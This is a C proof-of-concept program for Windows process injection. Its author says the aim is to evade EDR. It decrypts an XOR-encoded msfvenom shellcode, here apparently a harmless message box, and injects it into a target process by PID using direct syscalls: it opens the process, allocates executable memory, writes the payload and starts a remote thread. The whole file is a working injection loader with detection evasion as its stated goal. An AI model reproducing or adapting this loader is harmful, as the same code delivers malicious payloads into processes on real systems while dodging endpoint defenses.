// POC code for shellcode injection. This hopefully isn't detected by EDR.

#include <stdio.h>
#include "syscalls.h"


int main(int argc, const char* argv[]) {
	// payload .\msfvenom.bat -p windows/x64/messagebox TEXT="The POC Worked!" --encrypt xor --encrypt-key ~ -f csharp
	unsigned char payload[] = { 0x82,0x36,0xff,0x9a,0x8e,0x81,
	0x81,0x81,0x96,0xae,0x7e,0x7e,0x7e,0x3f,0x2f,0x3f,0x2e,0x2c,
	0x2f,0x28,0x36,0x4f,0xac,0x1b,0x36,0xf5,0x2c,0x1e,0x40,0x36,
	0xf5,0x2c,0x66,0x40,0x36,0xf5,0x2c,0x5e,0x40,0x36,0xf5,0x0c,
	0x2e,0x40,0x36,0x71,0xc9,0x34,0x34,0x33,0x4f,0xb7,0x36,0x4f,
	0xbe,0xd2,0x42,0x1f,0x02,0x7c,0x52,0x5e,0x3f,0xbf,0xb7,0x73,
	0x3f,0x7f,0xbf,0x9c,0x93,0x2c,0x3f,0x2f,0x40,0x36,0xf5,0x2c,
	0x5e,0x40,0xf5,0x3c,0x42,0x36,0x7f,0xae,0x40,0xf5,0xfe,0xf6,
	0x7e,0x7e,0x7e,0x36,0xfb,0xbe,0x0a,0x11,0x36,0x7f,0xae,0x2e,
	0x40,0xf5,0x36,0x66,0x40,0x3a,0xf5,0x3e,0x5e,0x37,0x7f,0xae,
	0x9d,0x22,0x36,0x81,0xb7,0x40,0x3f,0xf5,0x4a,0xf6,0x36,0x7f,
	0xa8,0x33,0x4f,0xb7,0x36,0x4f,0xbe,0xd2,0x3f,0xbf,0xb7,0x73,
	0x3f,0x7f,0xbf,0x46,0x9e,0x0b,0x8f,0x40,0x32,0x7d,0x32,0x5a,
	0x76,0x3b,0x47,0xaf,0x0b,0xa8,0x26,0x40,0x3a,0xf5,0x3e,0x5a,
	0x37,0x7f,0xae,0x18,0x40,0x3f,0xf5,0x72,0x36,0x40,0x3a,0xf5,
	0x3e,0x62,0x37,0x7f,0xae,0x40,0x3f,0xf5,0x7a,0xf6,0x36,0x7f,
	0xae,0x3f,0x26,0x3f,0x26,0x20,0x27,0x24,0x3f,0x26,0x3f,0x27,
	0x3f,0x24,0x36,0xfd,0x92,0x5e,0x3f,0x2c,0x81,0x9e,0x26,0x3f,
	0x27,0x24,0x40,0x36,0xf5,0x6c,0x97,0x37,0x81,0x81,0x81,0x23,
	0x37,0xb9,0xbf,0x7e,0x7e,0x7e,0x7e,0x40,0x36,0xf3,0xeb,0x80,
	0x7e,0x7e,0x7e,0x40,0x32,0xf3,0xfb,0x73,0x7f,0x7e,0x7e,0x36,
	0x4f,0xb7,0x3f,0xc4,0x3b,0xfd,0x28,0x79,0x81,0xab,0x36,0x4f,
	0xb7,0x3f,0xc4,0x8e,0xcb,0xdc,0x28,0x81,0xab,0x2a,0x16,0x1b,
	0x5e,0x2e,0x31,0x3d,0x5e,0x29,0x11,0x0c,0x15,0x1b,0x1a,0x7e,
	0x33,0x1b,0x0d,0x0d,0x1f,0x19,0x1b,0x3c,0x11,0x06,0x7e };

	SIZE_T payloadLength = sizeof(payload);

	// Decrypt payload
	char secret = '~';
	for (int i = 0; i < sizeof(payload) - 1; i++) {
		payload[i] = payload[i] ^ secret;
	};

	if (argc < 2) {
		printf("Usage: undetected.exe <PID>\n");
		return 0;
	}

	DWORD pid = atoi(argv[1]);
	

	HANDLE procHandler, threadHandler;
	CLIENT_ID cid = { (HANDLE)pid, NULL };
	OBJECT_ATTRIBUTES objAttr = { sizeof(objAttr) };
	NtOpenProcess(&procHandler, PROCESS_ALL_ACCESS, &objAttr, &cid); // Attemp to open process

	// Allocate virtual memory
	LPVOID baseAddress = NULL;
	NtAllocateVirtualMemory(procHandler, &baseAddress, 0, &payloadLength, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	// Write to memory
	NtWriteVirtualMemory(procHandler, baseAddress, &payload, sizeof(payload), NULL);

	// Create a remote thred
	NtCreateThreadEx(&threadHandler, GENERIC_EXECUTE, NULL, procHandler, baseAddress, NULL, FALSE, 0, 0, 0, NULL);
	
	NtClose(procHandler);

	return 0;
}